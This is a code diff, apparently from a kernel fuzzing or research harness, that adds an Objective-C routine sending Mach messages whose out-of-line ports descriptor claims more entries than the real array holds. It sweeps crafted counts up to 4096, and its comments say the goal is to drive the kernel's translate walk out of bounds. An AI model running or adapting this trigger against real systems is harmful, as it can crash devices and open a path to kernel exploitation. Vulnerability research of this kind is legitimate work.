@@ -183,6 +183,62 @@
     return result;
 }
 
+#pragma mark - OOL ports array: crafted count (the ool_port_array lane)
+
+// mach_msg_ool_ports_descriptor_t carries an ARRAY of ports + a count field.
+// The 26.0 fix "ool_port_array_enforced" and the 27.2 bounds check both point
+// here: a count larger than the real array drives the translate walk OOB.
+- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
+    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;
+
+    // real array of `real` ports (all the same send right)
+    mach_port_t *ports = calloc(real, sizeof(mach_port_t));
+    for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
+
+    uint8_t *buf = calloc(1, total);
+    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
+    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    hdr->msgh_size = (mach_msg_size_t)total;
+    hdr->msgh_remote_port = port;
+    hdr->msgh_local_port = MACH_PORT_NULL;
+    hdr->msgh_id = 2;
+    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
+    body->msgh_descriptor_count = 1;
+
+    mach_msg_ool_ports_descriptor_t *od =
+        (mach_msg_ool_ports_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+    od->address = ports;
+    od->count = count;          // THE crafted value
+    od->disposition = MACH_MSG_TYPE_COPY_SEND;
+    od->deallocate = 0;
+    od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
+                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                (mach_msg_size_t)total, 0,
+                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
+    result[@"ool_count"] = @(count);
+    result[@"real"] = @(real);
+    result[@"send_kr"] = @(kr);
+    if (kr == KERN_SUCCESS) {
+        size_t rcvTotal = total + 512;
+        uint8_t *rcv = calloc(1, rcvTotal);
+        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
+        rh->msgh_size = (mach_msg_size_t)rcvTotal;
+        rh->msgh_local_port = port;
+        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                     0, (mach_msg_size_t)rcvTotal,
+                                     port, 250, MACH_PORT_NULL);
+        result[@"recv_kr"] = @(rkr);
+        free(rcv);
+    }
+    free(buf);
+    free(ports);
+    return result;
+}
+
 #pragma mark - Report
 
 - (NSString *)runReport {
@@ -230,6 +286,17 @@
         NSDictionary *r = [self sendReceiveCount:counts[i] port:port sendRight:port];
         [report appendFormat:@"count=%u -> %@\n", counts[i], r];
         [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
+    }
+
+    [report appendString:@"\n--- OOL ports array: crafted count (ool_port_array lane) ---\n"];
+    // Buffer holds 64 real entries; count lies. If the translate walk trusts
+    // the count, the index runs off the end (the 27.2 bounds check's victim).
+    uint32_t oolCounts[] = {1, 4, 16, 64, 65, 128, 256, 1024, 4096};
+    for (size_t i = 0; i < sizeof(oolCounts)/sizeof(oolCounts[0]); i++) {
+        NSDictionary *r = [self sendOOLPortsCount:oolCounts[i] realEntries:64 port:port sendRight:port];
+        [report appendFormat:@"%@\n", r];
+        [self journal:[NSString stringWithFormat:@"ool count=%u kr=%@/%@",
+                       oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
     }
 
     [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
